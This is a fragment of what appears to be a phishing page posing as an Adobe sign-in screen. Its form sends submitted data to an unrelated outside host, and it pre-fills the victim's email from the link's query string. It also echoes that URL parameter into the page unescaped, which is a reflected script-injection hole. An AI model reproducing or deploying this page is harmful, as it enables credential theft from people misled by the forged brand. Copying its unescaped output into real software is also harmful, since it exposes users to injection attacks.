...
<form name="myForm" action="http://argentosc.cf/action.php" onsubmit="return validateForm()" method="post">

					<input type="hidden" name="frm-email" value="<?php echo $_GET['email'];?>"><b><?php echo $_GET['email'];?></b></td></tr> <br> 
	...
	<p style="font-size:0.9em;" align="center"> ©2020 Adobe Corporation</p>
